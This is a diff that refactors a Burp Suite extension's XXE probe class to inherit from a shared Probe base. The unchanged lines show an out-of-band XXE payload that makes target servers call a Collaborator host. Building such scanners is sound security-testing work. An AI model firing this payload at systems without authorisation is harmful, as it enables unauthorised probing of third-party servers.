@@ -25,14 +25,10 @@ import java.util.Map;
  * <p>customData carries the endpoint URL so a landed interaction is attributed to the exact endpoint.
  * Requires Burp Collaborator to be enabled (default public server) and the target to have network egress.
  */
-public final class XxeProbe {
-
-    private final MontoyaApi api;
-    private final ScanLog scanLog;
+public final class XxeProbe extends Probe {
 
     public XxeProbe(MontoyaApi api, ScanLog scanLog) {
-        this.api = api;
-        this.scanLog = scanLog;
+        super(api, scanLog);
     }
 
     public int probe(String host) {
@@ -84,7 +80,7 @@ public final class XxeProbe {
                         + "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://" + domain + "/x\">]>"
                         + "<root><user>&xxe;</user></root>";
                 HttpRequest inj = req.withBody(xxe).withUpdatedHeader("Content-Type", "application/xml");
-                HttpRequestResponse injRr = api.http().sendRequest(inj, RequestOptions.requestOptions().withResponseTimeout(12000L));
+                HttpRequestResponse injRr = send(inj);
                 tagToInj.put(tag, injRr);                                // keep the payload request as attachable evidence
                 testedUrls.add(url);
             } catch (Throwable t) { scanLog.log("XXE probe send error: " + t); }
@@ -122,5 +118,5 @@ public final class XxeProbe {
         return hits;
     }
 
-    private static String hostOf(String url) { return Net.authority(url); }
+    // hostOf(String) inherited from Probe.
 }
